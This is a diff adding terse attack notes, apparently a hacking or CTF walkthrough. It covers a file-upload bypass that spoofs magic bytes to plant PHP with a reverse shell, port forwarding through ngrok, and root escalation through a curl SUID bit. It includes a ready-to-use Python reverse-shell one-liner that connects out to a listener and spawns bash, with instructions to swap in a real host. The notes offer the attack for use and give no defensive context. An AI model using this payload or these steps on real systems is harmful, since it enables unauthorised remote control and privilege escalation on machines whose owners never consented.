@@ -1,1 +1,19 @@
 
+change agic bytes & input malicious php code which contains a reverse shell
+
+
+Get file path after upload
+
+
+set up ngrok tcp server to port forward
+
+
+
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' just change 10.0.0.1 and 4242 to the url and port without the tcp:// if bin/bash doesn't work use /bin/sh
+
+
+Escalating to root with curl suid bit set. 
+
+
+https://paste.c-net.org/
